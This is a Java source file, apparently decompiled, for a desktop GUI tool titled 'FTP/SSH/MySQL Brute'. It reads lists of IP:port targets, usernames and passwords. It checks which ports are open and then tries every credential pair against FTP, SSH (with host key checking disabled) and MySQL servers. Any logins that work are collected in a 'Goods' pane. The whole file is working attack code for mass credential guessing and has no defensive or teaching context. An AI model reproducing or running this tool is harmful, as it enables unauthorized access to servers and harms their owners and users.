package neko.itskekoffcode.hclient.gui;

import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;
import java.awt.EventQueue;
import java.awt.TextArea;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.UIManager.LookAndFeelInfo;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

public class GuiFTP_SSH_MySQL_Brute extends JFrame {
    private final List<String> listUsers = new ArrayList();
    private final List<String> listPasswords = new ArrayList();
    private static final Thread thread = null;
    static int th = 0;
    private JButton jButton1;
    private JComboBox<String> jComboBox1;
    private JLabel jLabel1;
    private JLabel jLabel2;
    private JLabel jLabel3;
    private JLabel jLabel4;
    private JLabel jLabel5;
    private JTextField jTextField1;
    private JTextField jTextField2;
    private JTextField jTextField3;
    private TextArea textArea1;
    private TextArea textArea2;

    public GuiFTP_SSH_MySQL_Brute() {
        this.initComponents();
    }

    private void initComponents() {
        this.jTextField1 = new JTextField();
        this.jLabel1 = new JLabel();
        this.jTextField2 = new JTextField();
        this.jLabel2 = new JLabel();
        this.jTextField3 = new JTextField();
        this.jLabel3 = new JLabel();
        this.textArea1 = new TextArea();
        this.textArea2 = new TextArea();
        this.jLabel4 = new JLabel();
        this.jLabel5 = new JLabel();
        this.jButton1 = new JButton();
        this.jComboBox1 = new JComboBox();
        this.setTitle("FTP/SSH/MySQL Brute");
        this.jTextField1.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiFTP_SSH_MySQL_Brute.this.jTextField1ActionPerformed(evt);
            }
        });
        this.jLabel1.setText("List with IP:Port");
        this.jTextField2.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiFTP_SSH_MySQL_Brute.this.jTextField2ActionPerformed(evt);
            }
        });
        this.jLabel2.setText("List with logins");
        this.jLabel3.setText("List with passwords");
        this.jLabel4.setText("Log");
        this.jLabel5.setText("Goods");
        this.jButton1.setText("Start");
        this.jButton1.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiFTP_SSH_MySQL_Brute.this.jButton1ActionPerformed(evt);
            }
        });
        this.jComboBox1.setModel(new DefaultComboBoxModel(new String[]{"FTP", "SSH", "MySQL"}));
        GroupLayout layout = new GroupLayout(this.getContentPane());
        this.getContentPane().setLayout(layout);
        layout.setHorizontalGroup(layout.createParallelGroup(Alignment.LEADING).addGroup(Alignment.TRAILING, layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(Alignment.LEADING).addGroup(layout.createParallelGroup(Alignment.LEADING, false).addComponent(this.jTextField1).addComponent(this.jTextField2).addComponent(this.jLabel1).addComponent(this.jLabel2).addComponent(this.jTextField3, -1, 104, 32767)).addComponent(this.jLabel3).addComponent(this.jLabel4)).addPreferredGap(ComponentPlacement.RELATED, 119, 32767).addGroup(layout.createParallelGroup(Alignment.LEADING, false).addComponent(this.jLabel5).addComponent(this.textArea1, -2, 206, -2).addGroup(Alignment.TRAILING, layout.createSequentialGroup().addGroup(layout.createParallelGroup(Alignment.TRAILING).addComponent(this.jComboBox1, Alignment.LEADING, 0, -1, 32767).addComponent(this.jButton1, -1, -1, 32767)).addContainerGap()))).addGroup(layout.createParallelGroup(Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addComponent(this.textArea2, -2, 207, -2).addContainerGap(222, 32767))));
        layout.setVerticalGroup(layout.createParallelGroup(Alignment.LEADING).addGroup(layout.createSequentialGroup().addGap(19, 19, 19).addGroup(layout.createParallelGroup(Alignment.LEADING).addGroup(layout.createSequentialGroup().addComponent(this.jLabel1).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jTextField1, -2, -1, -2).addGap(9, 9, 9).addComponent(this.jLabel2).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jTextField2, -2, -1, -2)).addComponent(this.jButton1, -2, 78, -2)).addGap(13, 13, 13).addGroup(layout.createParallelGroup(Alignment.BASELINE).addComponent(this.jLabel3).addComponent(this.jComboBox1, -2, -1, -2)).addGap(1, 1, 1).addComponent(this.jTextField3, -2, -1, -2).addPreferredGap(ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(Alignment.BASELINE).addComponent(this.jLabel4).addComponent(this.jLabel5)).addPreferredGap(ComponentPlacement.RELATED, -1, 32767).addComponent(this.textArea1, -2, 150, -2).addGap(21, 21, 21)).addGroup(layout.createParallelGroup(Alignment.LEADING).addGroup(Alignment.TRAILING, layout.createSequentialGroup().addContainerGap(193, 32767).addComponent(this.textArea2, -2, 150, -2).addGap(20, 20, 20))));
        this.pack();
    }

    private void jTextField1ActionPerformed(ActionEvent evt) {
    }

    private void jTextField2ActionPerformed(ActionEvent evt) {
    }

    private void jButton1ActionPerformed(ActionEvent evt) {
        (new Thread() {
            public void run() {
                try {
                    BufferedReader sourceReader = new BufferedReader(new FileReader(new File(GuiFTP_SSH_MySQL_Brute.this.jTextField1.getText())));
                    String sourceLine = null;

                    while((sourceLine = sourceReader.readLine()) != null) {
                        GuiFTP_SSH_MySQL_Brute.this.textArea2.append(sourceLine + "\n");
                        String[] splitS = sourceLine.split(":");
                        if (GuiFTP_SSH_MySQL_Brute.portIsOpen(splitS[0], Integer.parseInt(splitS[1]), 1000)) {
                            if (GuiFTP_SSH_MySQL_Brute.this.jComboBox1.getSelectedItem() == "FTP") {
                                try {
                                    GuiFTP_SSH_MySQL_Brute.this.bruteFTP(splitS);
                                } catch (IOException var8) {
                                    Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, var8);
                                }
                            }

                            if (GuiFTP_SSH_MySQL_Brute.this.jComboBox1.getSelectedItem() == "SSH") {
                                try {
                                    GuiFTP_SSH_MySQL_Brute.this.bruteSSH(splitS);
                                } catch (Exception var7) {
                                    Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, var7);
                                }
                            }

                            if (GuiFTP_SSH_MySQL_Brute.this.jComboBox1.getSelectedItem() == "MySQL") {
                                try {
                                    GuiFTP_SSH_MySQL_Brute.this.bruteMySQL(splitS);
                                } catch (Exception var6) {
                                    Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, var6);
                                }
                            }
                        }
                    }
                } catch (Exception var9) {
                    Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, var9);
                }

            }
        }).start();
    }

    public static boolean portIsOpen(String ip, int port, int timeout) {
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port), timeout);
            socket.close();
            return true;
        } catch (Exception var4) {
            return false;
        }
    }

    public void bruteMySQL(String[] splitS) throws Exception {
        String host = splitS[0];
        int port = Integer.parseInt(splitS[1]);
        Scanner in = new Scanner(new FileReader(this.jTextField2.getText()));
        this.listUsers.clear();
        this.listPasswords.clear();

        while(in.hasNext()) {
            this.listUsers.add(in.next());
        }

        Scanner in2 = new Scanner(new FileReader(this.jTextField3.getText()));

        while(in2.hasNext()) {
            this.listPasswords.add(in2.next());
            System.out.println(this.listPasswords.size());
        }

        Iterator var7 = this.listUsers.iterator();

        while(var7.hasNext()) {
            String user = (String)var7.next();
            Iterator var9 = this.listPasswords.iterator();

            while(var9.hasNext()) {
                String password = (String)var9.next();
                if ("%empty%".equals(password)) {
                    password = "";
                }

                try {
                    this.textArea2.append(splitS[0] + ":" + splitS[1] + ":" + user + ":" + password + "\n");
                    Connection connection = null;

                    try {
                        connection = DriverManager.getConnection("jdbc:mysql://" + host + ":" + port, user, password);
                    } catch (SQLException var12) {
                    }

                    if (connection != null) {
                        this.textArea1.append(splitS[0] + ":" + splitS[1] + ":" + user + ":" + password + "\n");
                    }
                } catch (Exception var13) {
                    var13.printStackTrace();
                }
            }
        }

    }

    public void bruteSSH(String[] splitS) throws Exception {
        String host = splitS[0];
        int port = Integer.parseInt(splitS[1]);
        BufferedReader sourceReader = new BufferedReader(new FileReader(new File(this.jTextField2.getText())));
        String name = null;

        while((name = sourceReader.readLine()) != null) {
            BufferedReader sourceReader2 = new BufferedReader(new FileReader(new File(this.jTextField3.getText())));
            String password2 = null;

            while((password2 = sourceReader2.readLine()) != null) {
                String user = name;
                if ("%empty%".equals(password2)) {
                    password2 = "";
                }

                String password = password2;
                this.textArea2.append(splitS[0] + ":" + splitS[1] + ":" + name + ":" + password2 + "\n");

                try {
                    JSch jsch = new JSch();
                    Session session = jsch.getSession(user, host, port);
                    session.setPassword(password);
                    session.setConfig("StrictHostKeyChecking", "no");
                    session.connect();
                    ChannelSftp sftpChannel = (ChannelSftp)session.openChannel("sftp");
                    sftpChannel.connect();
                    this.textArea1.append(splitS[0] + ":" + splitS[1] + ":" + user + ":" + password + "\n");
                } catch (Exception var13) {
                    System.err.print(var13);
                }
            }
        }

    }

    public void bruteFTP(String[] splitS) throws IOException {
        String server = splitS[0];
        int port = Integer.parseInt(splitS[1]);
        BufferedReader sourceReader = new BufferedReader(new FileReader(new File(this.jTextField2.getText())));
        String name = null;

        while((name = sourceReader.readLine()) != null) {
            BufferedReader sourceReader2 = new BufferedReader(new FileReader(new File(this.jTextField3.getText())));
            String password = null;

            while((password = sourceReader2.readLine()) != null) {
                String user = name;
                if ("%empty%".equals(password)) {
                    password = "";
                }

                String pass = password;
                this.textArea2.append(splitS[0] + ":" + splitS[1] + ":" + name + ":" + password + "\n");
                FTPClient ftpClient = new FTPClient();

                try {
                    ftpClient.connect(server, port);
                    int replyCode = ftpClient.getReplyCode();
                    if (!FTPReply.isPositiveCompletion(replyCode)) {
                        return;
                    }

                    boolean success = ftpClient.login(user, pass);
                    if (success) {
                        this.textArea1.append(splitS[0] + ":" + splitS[1] + ":" + user + ":" + pass + "\n");
                    }
                } catch (Exception var13) {
                    var13.printStackTrace();
                }
            }
        }

    }

    public static void main(String[] args) {
        try {
            LookAndFeelInfo[] var4;
            int var3 = (var4 = UIManager.getInstalledLookAndFeels()).length;

            for(int var2 = 0; var2 < var3; ++var2) {
                LookAndFeelInfo info = var4[var2];
                if ("Nimbus".equals(info.getName())) {
                    UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException var6) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, var6);
        } catch (InstantiationException var7) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, var7);
        } catch (IllegalAccessException var8) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, var8);
        } catch (UnsupportedLookAndFeelException var9) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, var9);
        }

        try {
            Class.forName("com.mysql.jdbc.Driver");
        } catch (ClassNotFoundException var5) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, var5);
        }

        EventQueue.invokeLater(new Runnable() {
            public void run() {
                (new GuiFTP_SSH_MySQL_Brute()).setVisible(true);
            }
        });
    }
}
